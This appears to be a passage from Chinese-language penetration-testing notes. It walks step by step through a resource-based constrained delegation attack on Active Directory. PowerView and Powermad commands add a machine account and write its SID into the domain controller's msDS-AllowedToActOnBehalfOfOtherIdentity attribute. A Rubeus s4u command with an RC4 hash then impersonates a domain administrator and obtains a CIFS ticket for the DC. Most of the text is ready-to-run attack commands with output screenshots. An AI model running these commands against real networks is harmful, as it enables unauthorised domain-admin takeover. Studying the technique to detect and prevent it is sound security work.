	获取域管理员
	>Get-DomainUser|select -First 1
	域对象信息
	>Get-DomainObject -Identity 'DC=zone,DC=com'
	ms-ds-machineaccountquota允许非特权用户将最多 10 台计算机连接到域
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/406.png)

	查看有没有设置msDS-AllowedToActOnBehalfOfOtherIdentity策略
	>Get-DomainComputer dc|select name, msDS-AllowedToActOnBehalfOfOtherIdentity
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/407.png)

	用powermad添加一具备SPN的机器账户
	https://github.com/Kevin-Robertson/Powermad
	>New-MachineAccount -MachineAccount newcom
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/408.png)

	或
	>$pass = ConvertTo-SecureString '123qwe!@#' -AsPlainText –Force
	>New-MachineAccount –MachineAccount newcom -Password $pass
	或
	>New-MachineAccount -MachineAccount newcom -Password $(ConvertTo-SecureString '123qwe!@#' -AsPlainText -Force)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/409.png)

	获取添加的机器账户的SID
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/410.png)

	将添加的机器账户的SID设置给DC的msDS-AllowedToActOnBehalfOfOtherIdentity参数
	>$SD=New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-2346829310-1781191092-2540298887-1122)"; $SDBytes = New-Object byte[] ($SD.BinaryLength);$SD.GetBinaryForm($SDBytes, 0);Get-DomainComputer dc | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
	设置完成后查看
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/411.png)

	配置ACL允许访问
	>$RawBytes=Get-DomainComputer dc -Properties 'msds-allowedtoactonbehalfofotheridentity' |select -expand msds-allowedtoactonbehalfofotheridentity;$Descriptor= New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes,0;$Descriptor.DiscretionaryAcl
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/412.png)

	此时使用创建的机器账户的hash可伪造域管
	先获取newcom的NTLM
	>Rubeus.exe hash /password:123qwe!@# /user:newcom /domain:zone.com
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/413.png)

	导入票据伪造域管用户访问cifs服务
	>Rubeus.exe s4u /user:newcom$ /rc4:00AFFD88FA323B00D4560B F9FEF0EC2F /impersonateuser:godadmin /msdsspn:cifs/dc.zone.com /ptt
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/414.png)

	成功获取到godadmin的tgs
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/415.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/416.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/417.png)
